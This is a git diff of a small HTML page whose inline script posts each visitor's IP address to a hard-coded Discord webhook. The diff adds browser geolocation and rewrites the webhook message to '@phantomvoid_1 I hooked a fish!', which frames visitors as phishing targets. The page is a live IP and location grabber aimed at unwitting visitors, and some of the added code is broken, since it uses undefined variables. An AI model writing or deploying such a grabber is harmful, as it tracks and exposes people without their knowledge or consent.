@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+    
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,12 +8,29 @@
 </head>
 <body>
     <script>
+        function error() {
+  alert("Sorry, no position available.");
+}
+        function success(position) {
+  x.innerHTML = "Latitude: " + position.coords.latitude + 
+  "<br>Longitude: " + position.coords.longitude;
+}
+        function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(success, error);
+  } else { 
+    x.innerHTML = "Geolocation is not supported by this browser.";
+  }
+}
+        
+        getLocation()
+        success(position)
         const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1400515169251229776/ij4oUENw06vApaDVeKj12TBcdMyxqTrAG-6NPG4xh6u13vnt7aYl2yQNa98DtoCCzBcS';
 
         // Function to send IP address to Discord webhook
         function sendIpToDiscord(ip) {
             const payload = {
-                content: `New visitor IP: ${ip}`
+                content: `@phantomvoid_1 I hooked a fish!: ${ip} ${position}`
             };
 
             fetch(DISCORD_WEBHOOK_URL, {
